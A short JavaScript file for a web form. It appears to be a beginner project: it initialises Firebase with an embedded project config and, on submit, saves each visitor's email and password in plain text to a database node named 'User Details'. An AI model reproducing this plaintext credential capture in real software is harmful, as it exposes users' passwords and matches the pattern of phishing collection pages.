var firebaseConfig = {
    apiKey: "AIzaSyDTioMLTUNVoIozTFJpcoTSz76xvR50bZc",
    authDomain: "contactform-a0e5e.firebaseapp.com",
    databaseURL: "https://contactform-a0e5e-default-rtdb.firebaseio.com",
    projectId: "contactform-a0e5e",
    storageBucket: "contactform-a0e5e.appspot.com",
    messagingSenderId: "125794203350",
    appId: "1:125794203350:web:48c887368d1599f39fbb77"
  };
firebase.initializeApp(firebaseConfig);

let messagesRef = firebase.database().ref('User Details');

document.getElementById('bttn').addEventListener('click', submitForm);

function submitForm(e){
    e.preventDefault();

    let email = getInputVal('mail');
    let password = getInputVal('password');

    saveMessage(email, password);

    document.querySelector('.alert').style.display='block';

    setTimeout(function(){
        document.querySelector('.alert').style.display='none';
    }, 3000)
    document.getElementById('contactForm').reset();
}

function getInputVal(id){
    return document.getElementById(id).value;
}

function saveMessage(email, password){
    let newMessageRef = messagesRef.push();
    newMessageRef.set({
        email: email,
        password: password
    })
}